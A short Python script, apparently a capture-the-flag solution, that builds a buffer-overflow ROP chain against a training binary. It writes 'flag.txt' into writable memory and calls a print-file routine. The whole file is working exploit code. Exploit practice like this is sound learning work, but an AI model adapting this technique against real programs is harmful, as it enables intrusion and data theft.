#!/usr/bin/python3

import sys

POP_R14_R15 = 0x400690
POP_RDI = 0x400693
WRITE_TO_R14_ADDR = 0x400628 # SRC: R15
CALL_PRINTFILE = 0x400620
STR_ADDR = 0x601038 # Start of BSS (RW)

FILENAME = "flag.txt"

def write_ints(dat):
    for v in dat:
        sys.stdout.buffer.write(v.to_bytes(8, byteorder="little"))

def write_call(addr):
    write_ints([addr])

def write_offset():
    sys.stdout.buffer.write(b'A'*40)

def write_to_addr(val, dest_addr):
    write_call(POP_R14_R15)
    write_ints([dest_addr, val])
    write_call(WRITE_TO_R14_ADDR)

def write_str_to_addr(s, dest):
    offset = 0
    for char in s:
        write_to_addr(ord(char), dest + offset)
        offset = offset + 1

    write_to_addr(0, dest + offset)

write_offset()
write_str_to_addr(FILENAME, STR_ADDR)

write_call(POP_RDI)
write_ints([STR_ADDR])

write_call(CALL_PRINTFILE)
